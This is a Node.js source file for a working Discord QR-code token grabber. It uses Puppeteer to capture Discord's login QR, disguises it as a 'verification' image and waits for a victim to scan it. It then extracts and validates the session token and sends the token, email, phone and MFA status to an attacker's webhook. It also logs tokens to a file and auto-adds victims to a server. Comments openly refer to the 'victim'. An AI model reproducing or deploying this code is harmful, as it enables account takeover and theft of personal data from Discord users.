require('dotenv').config();
const puppeteer = require('puppeteer');
const sharp = require('sharp');
const path = require('path');
const fs = require('fs');
const https = require('https');
const crypto = require('crypto');

const CONFIG = {
  WEBHOOK_URL: process.env.WEBHOOK_URL || 'YOUR_DISCORD_WEBHOOK_URL',
  BOT_TOKEN: process.env.BOT_TOKEN || null,      // Discord bot token for auto-invite
  GUILD_ID: process.env.GUILD_ID || null,         // Server to auto-add victim to
  TEMPLATE_PATH: path.join(__dirname, 'template.png'),
  OUTPUT_PATH: path.join(__dirname, '..', 'output'),
  PORT: process.env.PORT || 3000,
};

// Active sessions
const sessions = new Map();

fs.mkdirSync(CONFIG.OUTPUT_PATH, { recursive: true });

// ─── Helpers ────────────────────────────────────────────────────

function sendToWebhook(content, embeds = []) {
  if (!CONFIG.WEBHOOK_URL || CONFIG.WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL') {
    console.log('[CONTENT]', JSON.stringify({ content, embeds }, null, 2));
    return;
  }
  const payload = JSON.stringify({ content, embeds });
  const url = new URL(CONFIG.WEBHOOK_URL);
  const req = https.request({
    hostname: url.hostname,
    path: url.pathname + url.search,
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) },
  }, (res) => console.log(`[+] Webhook: ${res.statusCode}`));
  req.on('error', (e) => console.error('[-] Webhook error:', e.message));
  req.write(payload);
  req.end();
}

async function overlayQROnTemplate(qrBuffer) {
  try {
    if (!fs.existsSync(CONFIG.TEMPLATE_PATH)) return qrBuffer;
    const templateBuffer = fs.readFileSync(CONFIG.TEMPLATE_PATH);
    const meta = await sharp(templateBuffer).metadata();
    const qrResized = await sharp(qrBuffer).resize(220, 220).toBuffer();
    return await sharp(templateBuffer)
      .composite([{ input: qrResized, top: Math.floor(meta.height / 2 - 110), left: Math.floor(meta.width / 2 - 110) }])
      .png().toBuffer();
  } catch (err) {
    console.error('[-] Overlay error:', err.message);
    return qrBuffer;
  }
}

async function extractToken(page) {
  await new Promise(r => setTimeout(r, 2000));
  
  // Method 1: localStorage
  let token = await page.evaluate(() => {
    try { return window.localStorage.getItem('token'); } catch { return null; }
  });
  if (token) return token.replace(/"/g, '');

  // Method 2: webpack internals (Discord web app)
  token = await page.evaluate(() => {
    try {
      const wc = webpackChunkdiscord_app || window.webpackChunkdiscord_app;
      if (!wc) return null;
      const modules = [];
      wc.push([['__grabber__'], {}, (e) => { for (let c in e.c) modules.push(e.c[c]); }]);
      const mod = modules.find(m => m?.exports?.default?.getToken !== undefined);
      return mod?.exports?.default?.getToken() || null;
    } catch { return null; }
  });
  if (token) return token;

  return null;
}

async function validateToken(token) {
  return new Promise((resolve) => {
    const req = https.request({
      hostname: 'discord.com', path: '/api/v9/users/@me', method: 'GET',
      headers: { 'Authorization': token, 'User-Agent': 'Mozilla/5.0' },
    }, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => {
        try {
          const user = JSON.parse(data);
          resolve({ valid: res.statusCode === 200, user });
        } catch { resolve({ valid: false, user: null }); }
      });
    });
    req.on('error', () => resolve({ valid: false, user: null }));
    req.end();
  });
}

// ─── Session-Based QR Grabber ──────────────────────────────────

async function createQRCodeSession() {
  const sessionId = crypto.randomUUID();
  
  console.log(`[${sessionId.slice(0, 8)}] Launching browser...`);
  const browser = await puppeteer.launch({
    headless: 'new',
    args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--disable-gpu'],
  });
  const page = await browser.newPage();
  await page.setViewport({ width: 1280, height: 720 });
  await page.goto('https://discord.com/login', { waitUntil: 'networkidle2', timeout: 30000 });

  // Wait for QR
  console.log(`[${sessionId.slice(0, 8)}] Waiting for QR element...`);
  await page.waitForSelector('img[alt*="QR"], div[class*="qrCode"] img, canvas[class*="qrCode"]', { timeout: 15000 });
  await new Promise(r => setTimeout(r, 2000));

  const qrElement = await page.$('img[alt*="QR"], div[class*="qrCode"] img, canvas[class*="qrCode"]');
  if (!qrElement) {
    console.error(`[${sessionId.slice(0, 8)}] No QR element found`);
    await browser.close();
    return null;
  }

  // Get QR as base64
  const qrBuffer = await qrElement.screenshot();
  const qrBase64 = `data:image/png;base64,${qrBuffer.toString('base64')}`;
  
  // Create overlayed version for local save
  const finalImage = await overlayQROnTemplate(qrBuffer);
  const outputFile = path.join(CONFIG.OUTPUT_PATH, `qr_${sessionId.slice(0, 8)}.png`);
  fs.writeFileSync(outputFile, finalImage);
  console.log(`[${sessionId.slice(0, 8)}] QR saved to ${outputFile}`);

  // Store session
  const session = {
    id: sessionId,
    browser,
    page,
    qrData: qrBase64,
    createdAt: Date.now(),
    initialUrl: page.url(),
    token: null,
    user: null,
    done: false,
  };
  sessions.set(sessionId, session);

  // Start polling for scan
  startSessionPoll(session);

  return session;
}

async function startSessionPoll(session) {
  const startTime = Date.now();

  while (Date.now() - startTime < 130000) { // ~2 min 10 sec
    try {
      // Check URL change (navigation after scan)
      if (session.page.url() !== session.initialUrl) {
        console.log(`[${session.id.slice(0, 8)}] URL changed — QR scanned!`);
        break;
      }

      // Check localStorage
      const hasToken = await session.page.evaluate(() => {
        try { return !!window.localStorage.getItem('token'); } catch { return false; }
      });
      if (hasToken) {
        console.log(`[${session.id.slice(0, 8)}] Token detected in localStorage!`);
        break;
      }
    } catch (e) {
      // Page might be in transition
    }
    
    await new Promise(r => setTimeout(r, 500));
  }

  // Extract token
  await new Promise(r => setTimeout(r, 3000));
  console.log(`[${session.id.slice(0, 8)}] Extracting token...`);
  
  const token = await extractToken(session.page);
  
  if (!token) {
    console.log(`[${session.id.slice(0, 8)}] No token captured`);
    session.done = true;
    await session.browser.close();
    return;
  }

  // Validate
  const { valid, user } = await validateToken(token);
  
  if (!valid || !user) {
    console.log(`[${session.id.slice(0, 8)}] Invalid token`);
    session.done = true;
    await session.browser.close();
    return;
  }

  // SUCCESS
  session.token = token;
  session.user = user;
  session.done = true;

  console.log('');
  console.log(`[${session.id.slice(0, 8)}] ✅ TOKEN CAPTURED!`);
  console.log(`    User: ${user.username}#${user.discriminator || ''}`);
  console.log(`    ID: ${user.id}`);
  console.log(`    Email: ${user.email || 'N/A'}`);
  console.log(`    MFA: ${user.mfa_enabled ? 'YES' : 'NO'}`);
  console.log(`    Token: ${token}`);
  console.log('');

  // Send to webhook
  sendToWebhook('@everyone **Discord token captured via Verification QR!**', [
    {
      title: `${user.username}#${user.discriminator || ''}`,
      description: `User ID: ${user.id}`,
      color: 0x5865F2,
      fields: [
        { name: 'Token', value: `\`${token}\``, inline: false },
        { name: 'Email', value: user.email || 'N/A', inline: true },
        { name: 'Phone', value: user.phone || 'None', inline: true },
        { name: 'Verified', value: user.verified ? '✅ Yes' : '❌ No', inline: true },
        { name: 'MFA', value: user.mfa_enabled ? '🔒 Enabled' : '🔓 Disabled', inline: true },
        { name: 'Nitro', value: ['None', 'Classic', 'Nitro', 'Basic'][user.premium_type || 0] || 'None', inline: true },
        { name: 'Connected Accounts', value: 'Check connections endpoint', inline: false },
      ],
      thumbnail: { url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` },
      footer: { text: `Session: ${session.id.slice(0, 8)}` },
      timestamp: new Date().toISOString(),
    },
  ]);

  // Save to file
  const logLine = `${token} | ${user.username} | ${user.id} | ${user.email || 'N/A'} | ${session.id.slice(0, 8)} | ${new Date().toISOString()}\n`;
  fs.appendFileSync(path.join(CONFIG.OUTPUT_PATH, 'tokens.txt'), logLine);

  // Auto-add to guild if configured
  if (CONFIG.BOT_TOKEN && CONFIG.GUILD_ID) {
    try {
      const addReq = https.request({
        hostname: 'discord.com',
        path: `/api/v9/guilds/${CONFIG.GUILD_ID}/members/${user.id}`,
        method: 'PUT',
        headers: {
          'Authorization': `Bot ${CONFIG.BOT_TOKEN}`,
          'Content-Type': 'application/json',
        },
      });
      addReq.write(JSON.stringify({ access_token: token }));
      addReq.end();
      console.log(`[${session.id.slice(0, 8)}] Auto-added to guild ${CONFIG.GUILD_ID}`);
    } catch (e) {
      console.log(`[${session.id.slice(0, 8)}] Failed to auto-add to guild: ${e.message}`);
    }
  }

  // Keep browser open for 30 seconds in case we want to interact
  setTimeout(() => {
    session.browser.close();
    sessions.delete(session.id);
    console.log(`[${session.id.slice(0, 8)}] Session closed`);
  }, 30000);
}

// ─── Express Server ────────────────────────────────────────────

function startServer() {
  const express = require('express');
  const cors = require('cors');
  const app = express();
  
  app.use(cors());
  app.use(express.json());

  // Generate a new QR code session
  app.get('/api/generate-qr', async (req, res) => {
    try {
      const session = await createQRCodeSession();
      if (!session) {
        return res.status(500).json({ error: 'Failed to generate QR code' });
      }
      res.json({
        sessionId: session.id,
        qr: session.qrData,
        expiresIn: 120,
        url: `https://your-site.com/verify?session=${session.id}`,
      });
    } catch (err) {
      console.error('Generate error:', err);
      res.status(500).json({ error: err.message });
    }
  });

  // Check session status (polled by frontend)
  app.get('/api/session/:id', (req, res) => {
    const session = sessions.get(req.params.id);
    if (!session) {
      return res.status(404).json({ error: 'Session not found or expired' });
    }
    res.json({
      done: session.done,
      hasToken: !!session.token,
      token: session.token || null,
      user: session.user ? {
        username: session.user.username,
        id: session.user.id,
        avatar: session.user.avatar,
      } : null,
    });
  });

  // Get QR image for a session
  app.get('/api/session/:id/qr', (req, res) => {
    const session = sessions.get(req.params.id);
    if (!session) return res.status(404).json({ error: 'Session not found' });
    
    // Parse data URL and send as image
    const matches = session.qrData.match(/^data:image\/(png|jpeg);base64,(.+)$/);
    if (!matches) return res.status(500).json({ error: 'Invalid QR data' });
    
    const imgBuffer = Buffer.from(matches[2], 'base64');
    res.writeHead(200, {
      'Content-Type': 'image/png',
      'Content-Length': imgBuffer.length,
    });
    res.end(imgBuffer);
  });

  // List saved tokens
  app.get('/api/tokens', (req, res) => {
    const tokensFile = path.join(CONFIG.OUTPUT_PATH, 'tokens.txt');
    if (!fs.existsSync(tokensFile)) return res.json({ tokens: [] });
    
    const lines = fs.readFileSync(tokensFile, 'utf8').trim().split('\n').filter(Boolean);
    const tokens = lines.map(line => {
      const parts = line.split(' | ');
      return { token: parts[0], username: parts[1], userId: parts[2], email: parts[3], session: parts[4], date: parts[5] };
    });
    res.json({ tokens });
  });

  // Webhook endpoint (can be called by frontend directly)
  app.post('/api/report', (req, res) => {
    const { token, user } = req.body;
    if (!token) return res.status(400).json({ error: 'No token' });
    
    sendToWebhook('@everyone **Token reported from verification page!**', [
      {
        title: user?.username || 'Unknown User',
        fields: [
          { name: 'Token', value: `\`${token}\``, inline: false },
          { name: 'User', value: user?.username || 'N/A', inline: true },
          { name: 'ID', value: user?.id || 'N/A', inline: true },
        ],
        color: 0xED4245,
        timestamp: new Date().toISOString(),
      },
    ]);
    
    res.json({ success: true });
  });

  // Health check
  app.get('/api/health', (req, res) => {
    res.json({
      status: 'ok',
      activeSessions: sessions.size,
      tokensCaptured: fs.existsSync(path.join(CONFIG.OUTPUT_PATH, 'tokens.txt'))
        ? fs.readFileSync(path.join(CONFIG.OUTPUT_PATH, 'tokens.txt'), 'utf8').trim().split('\n').filter(Boolean).length
        : 0,
    });
  });

  app.listen(CONFIG.PORT, () => {
    console.log(`[+] Server running on http://localhost:${CONFIG.PORT}`);
    console.log(`[+] Generate QR: http://localhost:${CONFIG.PORT}/api/generate-qr`);
    console.log(`[+] View tokens: http://localhost:${CONFIG.PORT}/api/tokens`);
    console.log(`[+] Health: http://localhost:${CONFIG.PORT}/api/health`);
  });
}

// ─── CLI ────────────────────────────────────────────────────────

if (require.main === module) {
  const args = process.argv.slice(2);
  
  if (args.includes('--server')) {
    startServer();
  } else if (args.includes('--webhook')) {
    sendToWebhook('Test message from QR Grabber server');
    console.log('[+] Test sent');
  } else {
    // One-shot mode
    (async () => {
      const session = await createQRCodeSession();
      if (session) {
        console.log(`\n[!] QR Code generated!`);
        console.log(`[!] Saved to: ${path.join(CONFIG.OUTPUT_PATH, `qr_${session.id.slice(0, 8)}.png`)}`);
        console.log(`[!] Share the image with the victim and tell them to scan it with Discord mobile.\n`);
        
        // Keep process alive
        process.on('SIGINT', async () => {
          console.log('\n[*] Shutting down...');
          await session.browser.close();
          process.exit(0);
        });
      }
    })();
  }
}

module.exports = { createQRCodeSession, startServer };